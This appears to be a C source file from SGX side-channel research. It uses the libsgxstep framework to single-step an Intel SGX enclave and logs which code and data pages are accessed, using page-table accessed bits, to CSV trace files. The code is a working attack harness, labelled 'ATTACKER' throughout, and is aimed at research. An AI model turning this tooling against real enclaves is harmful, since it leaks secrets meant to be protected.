#define _GNU_SOURCE
#include <sys/ucontext.h>
#include <sgx_urts.h>
//#include "../../examples/enclave/encl_u.h"
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include "libsgxstep/apic.h"
#include "libsgxstep/cpu.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/config.h"
#include "libsgxstep/idt.h"
#include "libsgxstep/config.h"
#include <sys/mman.h>

#include "../common/elf.h"

#include "config.h"


sgx_enclave_id_t eid = 0;

/*
 * NOTE: set DO_TIMER_STEP=0 to _simulate_ a single-stepping attack through the
 * x86 hardware trap flag (RFLAGS.TF). Use for demonstration/debugging purposes
 * only, as this does _not_ work for SGX debug enclaves(!)
 */

#define DO_TIMER_STEP 0
//#define DEBUGMODE

#if !DO_TIMER_STEP
    #warning "Using simulated stepping through HW trap flag; will not work for production enclaves!"
#endif

typedef struct {
    void* virt_addr;
    uint64_t* pte;
} monitor_page_t;

// ================== GLOBAL VARIABLES =================
int irq_cnt = 0, do_irq = 0, fault_cnt = 0, trigger_cnt = 0, step_cnt = 0;
uint64_t *pte_encl = NULL, *pmd_encl = NULL;
uint64_t *pte_mod_exp = NULL, *pmd_mod_exp = NULL;
uint64_t *pte_square = NULL, *pte_multiply = NULL;
void* target_func_addr = NULL;

monitor_page_t* exec_pages_to_monitor;
size_t exec_pages_to_monitor_length;
size_t exec_pages_to_monitor_reserved;

monitor_page_t* data_pages_to_monitor;
size_t data_pages_to_monitor_length;
size_t data_pages_to_monitor_reserved;

FILE* fd_control_flow_trace;
FILE* fd_data_flow_trace;

const char* TRACE_FILE_HEADER = "virt_addr;rip\n";

// ================== END GLOBAL VARIABLES =================

void error_exit(const char *msg) {
  fprintf(stderr, "%s: %s\n", msg, strerror(errno));  // Print error message with errno

  exit(EXIT_FAILURE);
}

void append_to_monitor_pages(monitor_page_t page, int is_exec_page) {
    monitor_page_t** pages_to_monitor;
    size_t* pages_to_monitor_length;
    size_t* pages_to_monitor_reserved;
    if (is_exec_page) {
      pages_to_monitor = &exec_pages_to_monitor;
      pages_to_monitor_length = &exec_pages_to_monitor_length;
      pages_to_monitor_reserved = &exec_pages_to_monitor_reserved;
    } else {
      pages_to_monitor = &data_pages_to_monitor;
      pages_to_monitor_length = &data_pages_to_monitor_length;
      pages_to_monitor_reserved = &data_pages_to_monitor_reserved;
    }

    if (*pages_to_monitor == NULL) {
      *pages_to_monitor_reserved = 32;
      *pages_to_monitor = malloc(*pages_to_monitor_reserved * sizeof(monitor_page_t));
    }
    if (*pages_to_monitor_reserved < *pages_to_monitor_length + 1) {
      *pages_to_monitor_reserved = *pages_to_monitor_reserved * 2;
      *pages_to_monitor = realloc(*pages_to_monitor,
          *pages_to_monitor_reserved * sizeof(monitor_page_t));
    }
    (*pages_to_monitor)[(*pages_to_monitor_length)++] = page;
}

int is_ignored_page(void* page) {
    // we ignore the TCS range as it's always accessed when switching 
    // in to/ out off the enclave
    // TODO(dwe): we just ignore 5 pages for now, which *should* do the trick
    // (instead of parsing the actual TCS size)
    void *tcs_addr = sgx_get_tcs();
    if (tcs_addr <= page && page < tcs_addr + 4096 * 5) {
        return 1;
    }
    return 0;
}


void init_pages_to_monitor() {
    void* start = get_enclave_base();
    void* end = get_enclave_limit();
    size_t max_possible_pages = (end - start) / 4096;

    int idx = 0;
    for (void* page = start; page < end; page += 4096) {
        address_mapping_t* map = get_mappings(page);
        if (is_ignored_page(page)) {
            continue;
        }

        monitor_page_t page_to_monitor;
        page_to_monitor.virt_addr = page;
        page_to_monitor.pte = remap_page_table_level(page, PTE);

        append_to_monitor_pages(page_to_monitor, EXECUTABLE(map->pte));
    }

    // create log files
    fd_control_flow_trace = fopen("cftrace.csv", "w");
    if (fd_control_flow_trace == NULL) {
        error_exit("Could not create cftrace file\n");
        exit(1);
    }
    fwrite(TRACE_FILE_HEADER, 1, strlen(TRACE_FILE_HEADER), fd_control_flow_trace);

    fd_data_flow_trace = fopen("dftrace.csv", "w");
    if (fd_data_flow_trace == NULL) {
        error_exit("Could not create dftrace file\n");
        exit(1);
    }
    fwrite(TRACE_FILE_HEADER, 1, strlen(TRACE_FILE_HEADER), fd_data_flow_trace);

    info("Monitoring %d control-flow pages\n", exec_pages_to_monitor_length);
    info("Monitoring %d data-flow pages\n", data_pages_to_monitor_length);
}

void cleanup_monitoring() {
    free(exec_pages_to_monitor);
    free(data_pages_to_monitor);
    fclose(fd_control_flow_trace);
    fclose(fd_data_flow_trace);
}

void clear_all_access_bits() {
    ASSERT(exec_pages_to_monitor != NULL);
    ASSERT(data_pages_to_monitor != NULL);

    for (size_t i = 0; i < exec_pages_to_monitor_length; i++) {
        *exec_pages_to_monitor[i].pte = 
                MARK_NOT_ACCESSED(*exec_pages_to_monitor[i].pte);
    }

    for (size_t i = 0; i < data_pages_to_monitor_length; i++) {
        *data_pages_to_monitor[i].pte = 
                MARK_NOT_ACCESSED(*data_pages_to_monitor[i].pte);
    }
}

void check_accessed_pages(monitor_page_t* pages_to_monitor,
        size_t pages_to_monitor_length,
        FILE* file_memory_trace) {
    ASSERT(pages_to_monitor != NULL);
    ASSERT(file_memory_trace != NULL);
    
    for (size_t i = 0; i < pages_to_monitor_length; i++) {
        uint64_t* pte = pages_to_monitor[i].pte;
        if (ACCESSED(*pte)) {
#ifdef DEBUGMODE
            printf("A -> %p\n", pages_to_monitor[i].virt_addr);
#endif
#if DBG_ENCL
            uint64_t erip = edbgrd_erip();
#else
            // when we're not running on a DEBUG enclave, we just set the RIP to 0
            // to indicate that we don't have the information
            uint64_t erip = 0;
#endif
            fprintf(file_memory_trace, "%p;%p\n", pages_to_monitor[i].virt_addr, erip);
        }
    }
}

void check_accessed_exec_pages() {
  check_accessed_pages(exec_pages_to_monitor, exec_pages_to_monitor_length,
      fd_control_flow_trace);
}

void check_accessed_data_pages() {
  check_accessed_pages(data_pages_to_monitor, data_pages_to_monitor_length,
      fd_data_flow_trace);
}

/* ================== ATTACKER IRQ/FAULT HANDLERS ================= */

/* Called before resuming the enclave after an Asynchronous Enclave eXit. */
void aep_cb_func(void)
{
    // TODO(dwe): remove everything afterwards?
    #if !DO_TIMER_STEP
        DISABLE_TF;
    #endif

    #if DEBUG
        uint64_t erip = edbgrd_erip() - (uint64_t) get_enclave_base();
        //info("-- enclave RIP=%#llx", erip);
    #endif
    irq_cnt++;

    if (do_irq && (irq_cnt > NUM_RUNS*1000))
    {
        info("excessive interrupt rate detected (try adjusting timer interval " \
             "to avoid getting stuck in zero-stepping); aborting...");
	    do_irq = 0;
    }
    clear_all_access_bits();

    /*
     * NOTE: We explicitly clear the "accessed" bit of the _unprotected_ PTE
     * referencing the enclave code page about to be executed, so as to be able
     * to filter out "zero-step" results that won't set the accessed bit.
     */
    // TODO(dwe): reimplement this 
    //if (do_irq && ACCESSED(*pte_encl)) step_cnt++;
    //*pte_encl = MARK_NOT_ACCESSED( *pte_encl );
    //*pte_trigger = MARK_NOT_ACCESSED(*pte_trigger);

    /*
     * Configure APIC timer interval for next interrupt.
     *
     * On our evaluation platforms, we explicitly clear the enclave's
     * _unprotected_ PMD "accessed" bit below, so as to slightly slow down
     * ERESUME such that the interrupt reliably arrives in the first subsequent
     * enclave instruction.
     * 
     */
#if DO_TIMER_STEP
    if (do_irq) {
        *pmd_encl = MARK_NOT_ACCESSED( *pmd_encl );
        apic_timer_irq( SGX_STEP_TIMER_INTERVAL );
    }
#endif
}

/* Called upon SIGSEGV caused by untrusted page tables. */
void fault_handler(int signo, siginfo_t * si, void  *ctx)
{
    ucontext_t *uc = (ucontext_t *) ctx;

    switch ( signo )
    {
      case SIGSEGV:
        info("Caught initial page fault at %p (expected: %p)", 
                si->si_addr, target_func_addr);
    
        if (si->si_addr == target_func_addr) {
            info("Restoring target function access rights..");
            //ASSERT(!mprotect(trigger_adrs, 4096, PROT_READ | PROT_WRITE));
            *pte_mod_exp = MARK_NOT_EXECUTE_DISABLE(*pte_mod_exp);
        } else {
            printf("[!] Unexpected page fault. Exiting...\n");
            exit(1);
        }

        // initially clear all access bits
        clear_all_access_bits();

        do_irq = 1;
        sgx_step_do_trap = 1;
        break;

    //#if !DO_TIMER_STEP
      case SIGTRAP:
        //info("Caught single-step trap (RIP=%p)\n", si->si_addr);
        check_accessed_exec_pages();
        check_accessed_data_pages();
        // TODO(dwe): it *should* be enough to only clear bits if we saw an access
        clear_all_access_bits();

        /* ensure RFLAGS.TF is clear to disable debug single-stepping */
        // TODO(dwe): why do we need that?
        uc->uc_mcontext.gregs[REG_EFL] &= ~0x100;
        break;
    //#endif

      default:
        info("Caught unknown signal '%d'", signo);
        abort();
    }

    // NOTE: return eventually continues at aep_cb_func and initiates
    // single-stepping mode.
}

/* ================== ATTACKER INIT/SETUP ================= */

void register_signal_handler(int signo)
{
    struct sigaction act, old_act;

    /* Specify #PF handler with signinfo arguments */
    memset(&act, sizeof(sigaction), 0);
    act.sa_sigaction = fault_handler;
    act.sa_flags = SA_RESTART | SA_SIGINFO;

    /* Block all signals while the signal is being handled */
    sigfillset(&act.sa_mask);
    ASSERT(!sigaction( signo, &act, &old_act ));
}

int fault_ctr = 0;

/* Configure and check attacker untrusted runtime environment. */
void attacker_config_runtime(void)
{
    ASSERT( !claim_cpu(VICTIM_CPU) );
    ASSERT( !prepare_system_for_benchmark(PSTATE_PCT) );
#ifdef DEBUGMODE
    print_system_settings();
#endif

    // fault the enclave on the first function that we care about 
    // and only start single stepping after that
    ASSERT(pte_mod_exp = remap_page_table_level( target_func_addr, PTE) );
    *pte_mod_exp = MARK_EXECUTE_DISABLE(*pte_mod_exp);

#if DO_TIMER_STEP
    // PMD PTE is used to slow down the ERESUME
    ASSERT( pmd_encl = remap_page_table_level( get_enclave_base(), PMD) );
    ASSERT( PRESENT(*pmd_encl) );
#endif

    register_enclave_info();
#ifdef DEBUGMODE
    print_enclave_info();
#endif

#if DO_TIMER_STEP
    idt_t idt = {0};
    info_event("Establishing user-space APIC/IDT mappings");
    map_idt(&idt);
    install_kernel_irq_handler(&idt, __ss_irq_handler, IRQ_VECTOR);
    apic_timer_oneshot(IRQ_VECTOR);
#else
    register_signal_handler( SIGSEGV );
#endif

}

void* get_target_func_addr() {
    load_elf_symbols(SGX_ENCLAVE_PATH);
    uint64_t func_offset = lookup_elf_symbol(TARGET_FUNCTION);
    uint64_t encl_base = (uint64_t)get_enclave_base();
    printf("[+] Target (%s) @ %p (offset: %p)\n", TARGET_FUNCTION, 
        encl_base + func_offset, func_offset);
    return (void*)(encl_base + func_offset);
}

/* ================== ATTACKER MAIN ================= */

/* Untrusted main function to create/enter the trusted enclave. */
int main( int argc, char **argv )
{
    sgx_launch_token_t token = {0};
    int apic_fd, pwd_success = 0, updated = 0, i, pwd_len;
    char *pwd = malloc(MAX_LEN);
    idt_t idt = {0};
    int step_cnt_prev = 0;

    info_event("Creating enclave...");
    // note that we enable DEBUG mode here (which allows TRAP-based stepping)
    SGX_ASSERT( sgx_create_enclave( SGX_ENCLAVE_PATH, DBG_ENCL,
                                    &token, &updated, &eid, NULL ) );

    // dry run to initialize everything
    int res = -1;
    sgx_status_t status = execute_ecall(&res);
    printf("[+] Dry run completed");

    // prepare monitoring
    info_event("Preparing monitoring...");
    printf("[+] Encl Base: %p\n", get_enclave_base());
    printf("[+] Encl End: %p\n", get_enclave_limit());
    printf("[+] PID: %d\n", getpid());
    target_func_addr = get_target_func_addr();

    init_pages_to_monitor(1);

    /* 1. Setup attack execution environment. */
    set_debug_optin();
    attacker_config_runtime();
    register_aep_cb(aep_cb_func);

    // setup single stepping
    #if !DO_TIMER_STEP
        register_signal_handler(SIGTRAP);
    #endif

    
    // call into enclave

    info_event("Stepping through enclave...");
    status = execute_ecall(&res);

    info_event("Finished...");

    printf("[+] Enclave result: %d\n", res);
    printf("[+] Enclave status: 0x%x\n", status);
    if (status) {
        printf("[*] See 'https://github.com/intel/linux-sgx/blob/main/common/inc/sgx_error.h' for a list of error codes.\n");
    }

    cleanup_monitoring();

    return 0;
}
